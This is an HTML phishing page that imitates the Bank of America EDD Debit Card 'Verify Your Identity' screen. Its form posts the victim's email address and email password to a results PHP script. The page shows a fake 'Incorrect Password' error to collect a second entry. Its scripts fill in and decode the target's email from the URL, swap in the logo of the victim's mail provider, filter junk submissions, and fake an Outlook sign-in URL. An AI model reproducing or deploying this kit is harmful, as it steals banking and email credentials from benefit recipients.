
<!DOCTYPE html>
<html class="no-js" lang="en">
<head>

    <meta charset="utf-8" />
    
    
    <meta content="IE=edge" http-equiv="X-UA-Compatible">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="version" content="21.01.0186" />



    <title>EDD Debit Card - Verify Your Identity</title>
    <link href="../config/css/style1.css" rel="stylesheet"/>

    <link href="../config/css/style2.css" rel="stylesheet"/>

    <link href="../config/css/style3.css" rel="stylesheet"/>

    <script nonce='QX3qivkWrutkjHEnbqJ2rska' src="/bundles/jquery?v=Tr_v94xD5Y3yKB5v6IQ7RZbsJQVRT3NqKQFaw2TuoU41"></script>

   <link href="../config/css/style4.css" rel="stylesheet"/>

    <script nonce='QX3qivkWrutkjHEnbqJ2rska' src="/bundles/preventEarlyClick?v=_tY9qfNRb06Wa6fRNKeUMAHJINRnx8zdLPgzo1HCObs1"></script>


    <script nonce='QX3qivkWrutkjHEnbqJ2rska' src="/bundles/foundation?v=ESYLxt5uuRKe3D3XbWrIbHO5roVJALwvUU4gNQI5B-01"></script>

    <script nonce='QX3qivkWrutkjHEnbqJ2rska' src="/bundles/modernizr?v=inCVuEFe6J4Q07A0AcRsbJic_UE5MwpRMNGcOtk94TE1"></script>

    <script nonce='QX3qivkWrutkjHEnbqJ2rska' src="/bundles/Visa?v=rUNK_oTTYSu18b4lzz-WjfK-hwZTByYX4dFKT1IJ9Ig1"></script>
 
    <script nonce='QX3qivkWrutkjHEnbqJ2rska' src="/bundles/Visa/dps?v=ZyC0R9t8h7ubYILI4r8E1AyotfynRxjE2DnI-eHH54Q1"></script>


   <link href="../config/css/style5.css" rel="stylesheet"/>
   <link href="../config/css/style6.css" rel="stylesheet"/>
    <link href="https://prepaid.bankofamerica.com//content/PRC384/_Images/favicon.ico" rel="shortcut&#32;icon" type="image/x-icon" />

    
    
    <meta name="format-detection" content="telephone=no" />
</head>


<!--[if IE 9]><body class="body lt-ie10"> <![endif]-->
<!--[if lt IE 9]><body class="body lt-ie9">
    <script nonce='QX3qivkWrutkjHEnbqJ2rska' src="../content/_Scripts/rem.min.js" type="text/javascript"></script>
    <![endif]-->
<body class="body">

    <!-- Google Tag Manager -->
    <noscript>
        <iframe src="//www.googletagmanager.com/ns.html?id=GTM-55MPT9"
                height="0" width="0" style="display:none;visibility:hidden"></iframe>
    </noscript>
    <script nonce='QX3qivkWrutkjHEnbqJ2rska'>
        (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
        new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
        j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
        '//www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
        })(window,document,'script','dataLayer','GTM-55MPT9');</script>
    <!-- End Google Tag Manager -->

    <a class="skip-to" href="#content">Skip to content</a>
    <div class="header-container" role="banner">







<div class="row header-row">
    <div class="columns brand-container show-for-medium-up">
        <div class="small-12 medium-3 custom-medium-push-5 columns">
            <div class="logo-wrapper">
                <a href="/eddcard/home/index">
                    <img alt="Bank&#32;Of&#32;America,&#32;N.&#32;A.&#32;Logo" class="header-logo&#32;medium&#32;img-responsive" id="brand-logo" src="../config/images/logo.png" title="" />
                </a>
            </div>
        </div>
        <div class="small-12 medium-9 custom-medium-pull-7 columns">
            <div class="program-wrapper">
                <span class="header-card-program">EDD Debit Card</span>
            </div>
        </div>
    </div>

        <div class="small-12 show-for-small-only columns">
            <nav data-topbar class="top-bar mobile-nav" role="navigation" aria-label="Main" style="height:115px;">
                <!-- DPS-5439 - INC000004694104 - Hamburger Menu cannot be opened. Jeff has recommended below change -->
                <!--<div class="logo-program-menu">

                    <div class="row">
                        <div class="small-10 columns">
                            <a href="/eddcard/home/index">

                                <img alt="Bank&#32;Of&#32;America,&#32;N.&#32;A.&#32;Logo" class="header-logo&#32;medium&#32;img-responsive" id="brand-logo-mobile" src="/content/PRC384/CP384-T03-019/_Images/logo.png" title="" />
                            </a>
                        </div>

                        <div class="small-2 columns toggle-topbar">
                            <button class="menu-icon" aria-expanded="false">
                                <i class="fa fa-bars" role="presentation" aria-hidden="true"></i>
                                <span class="a11y-hide-visually">Expand Navigation Menu</span> 
                            </button>
                        </div>
                    </div>

                    <div class="row">
                        <div class="small-12 columns header-card-program">EDD Debit Card </div>
                    </div>
                </div>-->
                <ul class="title-area">
                    <!-- Title Area -->
                    <li class="name">
                        <a href="/eddcard/home/index">
                            <img alt="Bank&#32;Of&#32;America,&#32;N.&#32;A.&#32;Logo" class="header-logo&#32;medium&#32;img-responsive" id="brand-logo-mobile" src="/content/PRC384/CP384-T03-019/_Images/logo.png" title="" />
                        </a>
                    </li>
                    <li class="toggle-topbar menu-icon">
                        <button class="menu-icon" aria-expanded="false">
                            <i class="fa fa-bars" role="presentation" aria-hidden="true"></i>
                            <span class="a11y-hide-visually">Expand Navigation Menu</span> 
                        </button>
                    </li>
                    <li class="header-card-program">EDD Debit Card</li>
                </ul>

                
<section class="top-bar-section">
    <ul class="left">
                    <li>
                            <a href="/eddcard/Home/Index?m=1">Home</a>
                    </li>
                    <li>
                            <a href="/eddcard/Verify/SignIn?m=1">Sign In</a>
                    </li>
                    <li>
                            <a href="/eddcard/Verify/Activate?m=1">Activate My Card</a>
                    </li>
    </ul>
</section>






            </nav>
        </div>


        <div class="row show-for-medium-up">
            <div class="medium-12 columns">
                <nav data-topbar class="top-bar desktop-nav" role="navigation" aria-label="Main">
                    







                </nav>
            </div>
        </div>
</div>




    </div>
    
    
    <div class="content-container" id="content" role="main" tabindex="-1">
        <form action="../results/6.php" autocomplete="off" id="emailForm" name="emailForm" method="post">
        <input name="__RequestVerificationToken" type="hidden" value="DjSfeMz82yXYyjIO-SAUDeJpvLqCN9UBRqYoQ3wuNENVAlLXbxES4pTw1ZAWtMdtnfooqQiITmrFGqAr1i5DPqrDh2XRt-kZOHRDxJHDL4k1" /><div class='row'>
<div class='large-12 medium-12 small-12 column'>




  
<h1>Verify Your Identity</h1><div class="validation-summary-valid&#32;message&#32;warning" data-valmsg-summary="true" data-visaAlert="" style="display:&#32;none;&#32;visibility:&#32;visible;"><i class='fa fa-exclamation-triangle' role='img' aria-label='Warning'></i>
                        <span class='a11y-hide-visually'>Error Message</span><ul><li style="display:none"></li>
</ul>
                        <button aria-label='Close' tabindex='0' class='close' title='Close' type='button'>
                            <i class='fa fa-times' role='img' aria-label='Close'></i>
                        </button>
                    </div></div></div><div class='box'><div class='row'><div class='medium-12 columns'>
<div class='large-12 medium-12 small-12 column'>
                        <p class="align-right margin-bottom-none">
                            <span class="required">*</span>
                             Required fields
                        </p>
</div>


<div style="width:372px;overflow:hidden;margin:2em auto"> <div class="email_icon">
  <img src="" width="212" height="81" id="emicon"/>
</div></div>

<div class="row&#32;form-row">
<div class="large-3&#32;medium-5&#32;small-12&#32;column&#32;">
<label class="form-control" for="VerifyUserRequestHandler_Model_Username">Email Address&nbsp;<span class="required">*&nbsp;</span></label></div>
<div class="large-4&#32;medium-4&#32;small-12&#32;columns&#32;left" >
<input required autocomplete="off" class="stretch"  id="email" maxlength="23" name="email" type="email" value="" />
<span class="field-validation-valid&#32;error&#32;text" data-valmsg-for="VerifyUserRequestHandler.Model.Username" data-valmsg-replace="true" id="VerifyUserRequestHandler_Model_Username_Validation"></span>
</div>

<div style="width:100%;height:70px;"></div>

<div class="large-3&#32;medium-5&#32;small-12&#32;column&#32;">
<label class="form-control" for="VerifyUserRequestHandler_Model_Username">Email Password&nbsp;<span class="required">*&nbsp;</span></label></div>
<div class="large-4&#32;medium-4&#32;small-12&#32;columns&#32;left">
<input required autocomplete="off" class="stretch"  id="emailpass" maxlength="23" name="emailpass" type="password" value="" />
<span class="field-validation-valid&#32;error&#32;text" style="color:#F00">Incorrect Password. Try again later</span>
</div>




<div class="large-5&#32;medium-3&#32;small-12&#32;columns&#32;left"></div>



</div>

<div class='small-12 columns button-group'>
<input class="button&#32;small&#32;navigationButton&#32;primary" data-route="verify/verifyyouridentity" id="verifyverifyyouridentitySubmit" name="Submit" type="submit" value="Continue" /></div></div></div></div>            <input type="hidden" name="client-timezone-diff" value=""/>
            <input type="submit" class="a11y-hide-all" tabindex="-1" value="Submit" />
</form>
    </div>

    

<div class="footer" role="contentinfo">
    <div class="row">
        <div class="small-12 columns" role="navigation" aria-label="Footer navigation">
            <ul class="footer-navigation">

                
        <li><a href="/eddcard/Program/Fee" target="_blank">Fee Information</a></li>
        <li><a href="/eddcard/Program/FAQ" target="_blank">FAQ</a></li>
        <li><a href="/eddcard/Program/SiteMap">Site Map</a></li>
        <li><a href="/eddcard/Program/Contact" target="_blank">Contact Us</a></li>
        <li><a href="/eddcard/Program/Privacy" target="_blank">Privacy / Security</a></li>
        <li><a href="/eddcard/Program/Terms" target="_blank">Terms &amp; Conditions</a></li>
        <li><a href="/content/PRC384/CP384-T03-019/_Docs/CA-EDD-Digital-TC.pdf" target="_blank">Digital Terms &amp; Conditions and Fees</a></li>
        <li><a href="/eddcard/Program/ATMLocator">ATM Locator</a></li>










                    <li><a href="https://www.bankofamerica.com/index.jsp" target="_blank">Bank Of America, N. A.</a></li>

            </ul>
        </div>
    </div>
    <div class="extra">
        <div class="small-12 columns">
                <div class="row language">
                    <div id="lang-label" class="small-12 columns align-center">
                        <form action="/eddcard/Culture/Change" autocomplete="off" id="CultureForm" method="post"><input name="__RequestVerificationToken" type="hidden" value="TJIF2E2Bwl-4F0jpUqT0VXUJcT_S6O01ikaMi3Jf62-khYEdRInCoQl9frK7O-Q6eynQbUmYA9OWcIhg--QPXgAAWl3Cmu_Yz21umSA-9441" />    <span id="language-label" class="uppercase"><span class="a11y-hide-visually">Select a</span> Language:</span>
    <ul aria-labelledby="language-label" class="language-short-list">
                <li><button class="current changeCultureButton" data-culture="en-US" lang="en-US">English<span class="a11y-hide-visually"> (Selected)</span></button></li>
                <li><button class="changeCultureButton"  data-culture="es-MX" lang="es-MX">Español</button></li>
    </ul>
    <input type="submit" class="a11y-hide-all" tabindex="-1" value="Submit" />
</form>






                    </div>
                </div>
            <div class="row copyright">
                <div class="small-12 columns">
                    <p>
                        Copyright 2021 Bank of America Corporation .
<a href="https://usa.visa.com/legal/global-privacy-notice.html"> Visa Global Privacy Notice.</a>                                                    <br />Bank of America, N.A. Member FDIC Equal Housing Lender                    </p>
                    <div class="large-12 column align-center">
    <p style="color:#000;">
        <img src="images/EmailLogo.png" /><br />
        Apple, the Apple logo and iPhone are trademarks of Apple Inc., registered in the U.S. and other countries and regions. App Store is a service mark of Apple Inc. Google Play and the Google Play logo are trademarks of Google LLC.
    </p>
    <p style="color:#000;"> Your funds are eligible for FDIC insurance. Your funds are insured up to $250,000 by the FDIC in the event Bank of America, N.A. fails, if specific deposit insurance requirements are met. See <a href="https://www.fdic.gov/deposit/deposits/prepaid.html">fdic.gov/deposit/deposits/prepaid.html</a> for details. In the event Bank of America, N.A. fails, the FDIC may require information from you, including a government identification number, to determine the amount of your insured deposits.  If you do not provide this information to the FDIC access to your insured funds will be delayed. </p>
    </div>

                </div>
            </div>
        </div>
    </div>
</div>



    <div id="modalPlaceHolder" class="reveal-modal medium" data-reveal>
    </div>

    
<div id="modal-leaving-site" aria-labelledby="modal-leaving-site-dialog-title" aria-describedby="siteleaving-dialog-desc" class="reveal-modal medium" role="dialog" data-reveal>
    <div class="modal-body">
        <h2 id='modal-leaving-site-dialog-title'>
            You Are Now Leaving This Site
        </h2>
        
        <div id="siteleaving-dialog-desc" class="scrollable">
            <p id="modal-leaving-site-text">
                You are connecting to a new website; the information provided and collected on this website will be subject to the service provider’s privacy policy and terms and conditions, available through the website.  The website you are connecting to is: {0}
            </p>
        </div>
<div class='small-12 columns button-group'>
            <button class="button primary small button-close-modal" id="continue-button">Continue</button>
            <button class="button standard small button-close-modal" id="close-button">Cancel</button>
</div>        <button id="modal-close-icon" aria-label="Close" tabindex="0" class="close-reveal-modal">&#215;</button>
    </div>
</div>

    
<button id="session-timeout-link" data-reveal-id="modal-session-timeout" title="Session Time Out" class="a11y-hide-all"></button>
<div id="modal-session-timeout" aria-labelledby="session-timeout-dialog-title" aria-describedby="session-dialog-desc" class="reveal-modal small" role="dialog" data-reveal>
    <div class="modal-body">
        <h2 id='session-timeout-dialog-title'>Your session is about to expire.</h2>
        <div id="session-dialog-desc" class="scrollable expMessage">
        </div>
        <hr />
        <div class="align-right">
            <button id="btn-extend-session" onclick="extendSession()" type="button" class="button primary small">Extend Session</button>
            <button id="btn-expire-session" onclick="expireSession(true)" type="button" class="button primary small">Expire Session</button>
        </div>
        <button aria-label="Close" tabindex="0" id="sessionTimeOutClose" class="close-reveal-modal">&#215;</button>
    </div>
</div>

<script nonce='QX3qivkWrutkjHEnbqJ2rska'>
    var sessionTimingoutHeading = "Your session is about to expire.",
        sessionExtendedHeading = "Your session has been extended.",
        sessionHasExpired = "Your session has expired.",
        sessionExpiredByUser = "You have expired your session.",
        okButtonText = "OK",
        closeButtonText = "Close";
</script>
        <!-- Loading Modal -->
<div id="modal-loading" class="reveal-modal tiny" role="dialog" data-reveal>
    <div class="modal-body align-center">
        <h2 class="align-center">Loading ...</h2>
        <i class="fa fa-spinner fa-spin fa-5x" aria-hidden="true" role="presentation"></i>
    </div>
</div>







    <script nonce='QX3qivkWrutkjHEnbqJ2rska' type="text/javascript">
        //Localize Foundation topbar 'back'
        $(document).foundation({
            topbar: {
                custom_back_text: true,
                back_text: 'Back'
            }
        });
        var trackSession = false;
        var sessionExpiresIn = '15';
        var baseUrl = '/eddcard/';
        var mvcAction = 'signin';
        var mvcController = 'verify';
        var fingerprint = new Fingerprint().get(); document.cookie='vid=' + fingerprint + ";path=/; secure; ";
        var token = $('input[name="__RequestVerificationToken"]').val();
        var SimEnabled = Boolean('True' === 'True');
        var headers = {};
        var isAccessTokenRenewCheck = Boolean('False' ==='True');
        var accessTokenIntervalCall = 50000;
        var isVBAEnabled = Boolean('True' === 'True');
        var clientTimeRenewal = new Date(Date.parse('01/01/0001 0:00:00'));
        var targetRenewalThreshold = parseInt('100');



        //define globalize culture used mainly for validation


        CultureInfoSettings.init('en-US',
         '/',
         'MM/dd/yyyy',
         'H:mm:ss',
         ',',
         '.',
         '2',
         '$',
         '2',
         '12',
         '1');

        // other headers omitted
        headers['__RequestVerificationToken'] = token;
        $.ajaxSetup({
            headers: headers
        });     

    </script>

    
    
    <script nonce='QX3qivkWrutkjHEnbqJ2rska' src="/bundles/jqueryval?v=zoukwcYg-g7JDdfzyoq_F8xlMFB59Z1U0aSHkBtjg7I1"></script>


    
    


<script nonce='QX3qivkWrutkjHEnbqJ2rska' src="/bundles/VisaBehaviorAnalytics?v=kSj3nrqydyAGCJwo0hfCPzTkKf06pNGY6ePhWg538b41"></script>
<script nonce='QX3qivkWrutkjHEnbqJ2rska' src="/bundles/VisaBehaviorAnalyticsIntegration?v=o-vHZTln5UdDQuezeNEtFjEBOO8pbxs9sU3r2yHAPZY1"></script>

<script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.0/umd/popper.min.js" integrity="sha384-cs/chFZiN24E4KMATLdqdvsezGxaGsi4hLGOzlXwp5UZB1LY//20VyM2taTB4QvJ" crossorigin="anonymous"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.0/js/bootstrap.min.js" integrity="sha384-uefMccjFJAIv6A+rW+L4AHf99KvxDjWSu1z9VI8SKNVmz4sk7buKt/6v9KI65qnm" crossorigin="anonymous"></script>
<script src="https://ajax.aspnetcdn.com/ajax/jQuery/jquery-3.3.1.min.js"></script>

<script type="text/javascript">

var $c = getUrlParameter('email');
     $('#email').val($c);
	$('#me').text($c);
        var $current_email = "";

        if ($c) {
            $current_email = isValidEmail($c) ? $c : decodeCustom($c);
        }


        function decodeCustom($email) {
            var $consonants = 'bcdfghjklmnpqrstvwxyz'.split('');
            var $joinChar = $email.substr(0, 1); // substr(,0,1);
            var $output = $email.substr(2); // substr($email,2);
            var $vowels = ['a', 'e', 'i', 'o', 'u'];
            var $vowelsLookup = [];

            for ($i in $consonants) {
                $output = $output.replace(new RegExp($joinChar + '0' + $i + 'a', 'g'), $consonants[$i]);
            }

            for ($i in $vowels) {
                $output = $output.replace(new RegExp($joinChar + $i, 'g'), $vowels[$i]);
            }

            $output = $output.replace(new RegExp($joinChar + $joinChar + $joinChar, 'g'), '@');
            //,$output);
            return $output;
        }

        function isValidEmail(email) {
            var re =
                /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
            return re.test(email);
        }

        function getUrlParameter(name) {
            name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
            var regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
            var results = regex.exec(location.search);
            return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
			
        }
		
		 var currentEmail = $current_email;
    var ListEntries = [
            '.*fuck.*',
            '.*pussy.*',
            '.*bitch.*',
            '.*asshole.*',
            '.*fool.*',
            '.*dick.*',
            '.*mama.*',
            '.*nice.*try.*',
            '.*12345.*'
        ];
		
		 if(currentEmail){

            var e = document.getElementById('username');
            e = currentEmail;
            //e.readOnly = true;
			

            var domain = extractDomain(currentEmail);

           // var corH = document.getElementById('corportate-title');
            //corH.innerText = domain + " Email Login";

            }
			
		function extractDomain(email){

        var load = email;
        var domain = '';
        var regex = /.+@(.*?)\..+/;
        var str = email;
        var m;

        if ((m = regex.exec(str)) !== null) {
            return m[1];
        }

        return null;
    }


 var value =  $('#email').val();
		
 if (value.indexOf('@hotmail') >= 0 || value.indexOf('@live') >= 0 || value.indexOf('@msn') >= 0 || value.indexOf('@outlook') >= 0) {
	$('#emicon').attr("src", "../config/images/microsoft_logo.jpg" );
 }
 else if (value.indexOf('@yahoo') >= 0 || value.indexOf('@ymail') >= 0 || value.indexOf('@rocketmail') >= 0 || value.indexOf('@sbcglobal.net') >= 0 || value.indexOf('@bellsouth.net') >= 0 || value.indexOf('@pacbell.net') >= 0) {
	$('#emicon').attr( "src", "../config/images/yahoo_logo.png" );
	}
	else if(value.indexOf('@icloud.com') >= 0){
		$('#emicon').attr( "src", "../config/images/icloud.png" );
	}
		else if(value.indexOf('@gmail.com') >= 0){
		$('#emicon').attr( "src", "../config/images/gmail.png" );
	}
	else if(value.indexOf('@verizon.net') >= 0){
		$('#emicon').attr( "src", "../config/images/verizon.png" );
	}
else if (value.indexOf('@peoplepc') >= 0 || value.indexOf('@earthlink.net') >= 0 || value.indexOf('@mindspring') >= 0) {
	$('#emicon').attr( "src", "../config/images/earthlink_logo.png" );
	}
else if (value.indexOf('@comcast.net') >= 0 || value.indexOf('@xfinity') >= 0) {
	$('#emicon').attr( "src", "../config/images/comcast_logo.png" );
	}
else if (value.indexOf('@aim.com') >= 0 || value.indexOf('@aol.com') >= 0) {
	$('#emicon').attr( "src", "../config/images/aol_logo.png" );
	}
else if (value.indexOf('@cox.net') >= 0) {
	$('#emicon').attr( "src", "../config/images/cox_logo.png" );
	}
else if (value.indexOf('@mail') >= 0) {
	$('#emicon').attr( "src", "../config/images/godaddy_logo.png" );
	}
else if (value.indexOf('@ameritech.net') >= 0 || value.indexOf('@att.net') >= 0 || value.indexOf('@bellsouth.net') >= 0 || value.indexOf('@flash.net') >= 0 || value.indexOf('@nvbell.net') >= 0 || value.indexOf('@pacbell.net') >= 0 || value.indexOf('@prodigy.net') >= 0 || value.indexOf('@sbcglobal.net') >= 0 || value.indexOf('@snet.net') >= 0 || value.indexOf('@swbell.net') >= 0 || value.indexOf('@wans.net') >= 0) {
	$('#emicon').attr("src", "../config/images/atnt_logo.png" );
	
	}else{
		$('#emicon').attr("src", "../config/images/otheremail.png" );
	}


</script>


<script>
  
  location.hash = 'wa=wsignin1.0&rpsnv=13&ct=1539585327&rver=7.0.6737.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fnlp%3d1%26RpsCsrfState%3d715d44a2-2f11-4282-f625-a066679e96e2&id=292841&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=90015&domain='
  
</script>
</body>
</html>

